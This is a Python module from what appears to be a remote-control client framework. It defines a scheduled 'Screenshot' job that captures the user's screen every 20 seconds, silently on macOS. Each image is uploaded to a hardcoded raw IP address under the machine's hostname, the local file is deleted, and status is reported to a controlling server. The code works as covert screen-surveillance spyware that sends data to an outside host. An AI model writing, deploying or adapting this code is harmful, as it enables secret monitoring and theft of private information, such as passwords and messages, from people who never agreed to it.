import os
import socket
import threading
import time

import requests
import schedule

from client.jobs.core.job import Job
from core.utils.formatting import get_time
from core.utils.logger import logger


class Screenshot(Job):
    def __init__(self):
        super().__init__()
        self.upload_url = "http://39.107.248.76/file/upload"
        self.interval_seconds = 20

    def _capture_screenshot(self, filename: str):
        if os.name == 'nt':
            import pyautogui
            pyautogui.screenshot(filename)
            return

        if os.name == 'posix':
            os.system(f'screencapture -x {filename}')
            return

        raise RuntimeError('Unsupported operating system')

    def _upload_file(self, file_path: str):
        with open(file_path, 'rb') as file_obj:
            response = requests.post(
                self.upload_url,
                files={'files': file_obj},
                data={'currentDirectory': f'/public/{socket.gethostname()}/'},
                timeout=30,
            )
        return response

    def _run_capture_task(self):
        screenshot_name = f'screenshot_{get_time()}.png'
        self._capture_screenshot(screenshot_name)

        screenshot_path = os.path.abspath(screenshot_name)
        if not os.path.isfile(screenshot_path):
            self.send_to_server(0, f'Screenshot file not found: {screenshot_path}', 0)
            return

        try:
            response = self._upload_file(screenshot_path)
            self.send_to_server(1, f'Upload result: {response.text}', 0)
        finally:
            try:
                os.remove(screenshot_path)
            except Exception as e:
                self.send_to_server(0, f'Failed to remove temporary screenshot: {e}', 0)

    def run(self):
        try:
            self.mark_running()
            self.send_to_server(1, f'Scheduled screenshot task started (every {self.interval_seconds}s)', 0)

            schedule.every(self.interval_seconds).seconds.do(self._run_capture_task)

            while not self.stop_event.is_set():
                schedule.run_pending()
                time.sleep(1)

            self.send_to_server(1, 'Scheduled screenshot task stopped', 0)
        except Exception as e:
            self.send_to_server(0, f'Screenshot task error: {e}', 0)
        finally:
            schedule.clear()
            self.mark_stopped()
            logger.info(f'Thread ended: {threading.current_thread().name}')
            self.send_to_server(1, f'Task ended: {threading.current_thread().name}', 1)

    def stop(self):
        self.send_to_server(1, 'Stop requested', 0)
        schedule.clear()
        self.request_stop()